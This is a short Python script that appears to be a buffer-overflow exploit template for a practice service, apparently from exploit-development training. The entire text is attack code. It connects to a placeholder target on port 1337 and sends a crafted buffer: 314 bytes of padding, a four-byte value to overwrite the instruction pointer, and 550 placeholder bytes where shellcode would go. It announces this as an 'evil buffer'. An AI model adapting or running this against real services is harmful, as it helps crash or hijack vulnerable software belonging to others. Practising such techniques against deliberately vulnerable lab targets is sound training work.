import socket

ip = "target_ip"
port = 1337

prefix = "OVERFLOWX "
offset = 314
overflow = "A" * offset
eip = "BBBB"
payload = "C" * 550
postfix = ""

buffer = prefix + overflow + eip + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
